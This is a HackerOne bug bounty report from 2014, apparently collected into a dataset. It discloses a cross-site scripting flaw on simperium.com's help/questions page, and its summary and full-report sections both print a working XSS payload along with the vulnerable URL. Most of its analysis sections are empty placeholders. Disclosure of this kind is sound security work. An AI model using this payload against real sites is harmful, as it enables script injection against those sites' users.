# xss in simperium.com

## Metadata
- **Source:** HackerOne
- **Report:** 13746 | https://hackerone.com/reports/13746
- **Submitted:** 2014-05-28
- **Reporter:** jeroldcamacho_
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hello Automattic,

I found xss here simperium.com

__XSS Payload:__
'"><img src=x onerror=prompt(document.domain);>

__Vulnerable Link:__
https://simperium.com/help/questions/

__Proof of Concept:__
http://i.imgur.com/E4CM58A.png

__Thanks,__
Jerold Camacho


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello Automattic,

I found xss here simperium.com

__XSS Payload:__
'"><img src=x onerror=prompt(document.domain);>

__Vulnerable Link:__
https://simperium.com/help/questions/

__Proof of Concept:__
http://i.imgur.com/E4CM58A.png

__Thanks,__
Jerold Camacho


</details>

---
*Analysed by Claude on 2026-05-24*
